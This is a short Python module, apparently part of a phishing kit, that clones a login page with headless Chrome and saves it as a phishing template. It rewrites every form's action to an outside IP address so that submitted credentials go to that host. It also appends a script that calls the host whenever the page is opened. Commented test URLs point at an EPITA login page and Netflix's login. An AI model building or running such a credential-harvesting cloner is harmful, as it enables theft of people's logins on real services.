import requests
import time
from bs4 import BeautifulSoup

# add selenium for scrapping
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
import environ
env = environ.Env()
environ.Env.read_env()


def clone(uuid,url):
    option = webdriver.ChromeOptions()
    option.headless = True
    option.add_argument("--headless=new")
    driver = webdriver.Chrome(options = option)
    
    driver.get(url)
    page_content = driver.page_source
    
    # Fermer le navigateur
    driver.quit()
    soup = BeautifulSoup(page_content, 'html.parser')

    # Trouver tous les formulaires dans la page
    formulaires = soup.find_all('form')

    for formulaire in formulaires:
        # Modifier ou remplacer le champ "action"
        
        formulaire['action'] = "http://89.3.229.135:8080/"

    # Afficher le HTML modifié
    page_content = soup.prettify()
    # Ajoute a la page une requete get lorsqu'elle est ouverte
    page_content += "\n<script>var xhr = new XMLHttpRequest();xhr.open('GET', 'http://89.3.229.135:8080/', true);xhr.send();</script>"


    fichier = open("./website/templates/pages/pages_fishing/"+str(uuid)+".html", "w", encoding="utf-8")
    fichier.write(page_content)
    fichier.close()



#test = "https://cri.epita.fr/auth/login?spnego=0"

#test= "https://www.netflix.com/fr/login"

#print(env("DB_HOST"))
